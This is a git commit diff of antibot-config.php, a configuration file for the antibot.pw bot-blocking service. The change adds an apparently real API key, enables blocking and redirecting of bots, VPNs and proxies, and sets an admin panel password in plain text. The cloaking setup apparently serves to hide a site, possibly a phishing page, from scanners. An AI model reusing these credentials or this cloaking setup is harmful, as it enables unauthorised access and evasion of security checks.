599054a001949f1031d2c085509057c1d0cfcca0
harrykane1010 <67982654+harrykane1010@users.noreply.github.com>
2020-07-14 15:05:56 +0100

    Update antibot-config.php

--- antibot-config.php
+++ antibot-config.php
@@ -5,11 +5,11 @@
  * @Last Modified by:   Nokia 1337
  * @Last Modified time: 2019-10-10 22:07:53
 */
-$config['apikey'] 			= '______________________________';  	// https://antibot.pw/dashboard/developers
+$config['apikey'] 			= 'd76b96707f7a696a4dfa28aa5f169b6f';  	// https://antibot.pw/dashboard/developers
 
 //--- [ PAGE CONFIG ] ---//
 
-$config['bot_block']    	= false; 						// if this domain is visited by bot / vpn / proxy it will be blocked. (Config Setting : https://antibot.pw/dashboard/antibot-blocker)
+$config['bot_block']    	= true; 						// if this domain is visited by bot / vpn / proxy it will be blocked. (Config Setting : https://antibot.pw/dashboard/antibot-blocker)
 $config['redirect_bot'] 	= 'https://google.com';
 $config['username_panel'] 	= 'admin';
-$config['password_panel'] 	= 'admin';
+$config['password_panel'] 	= 'paperstack';
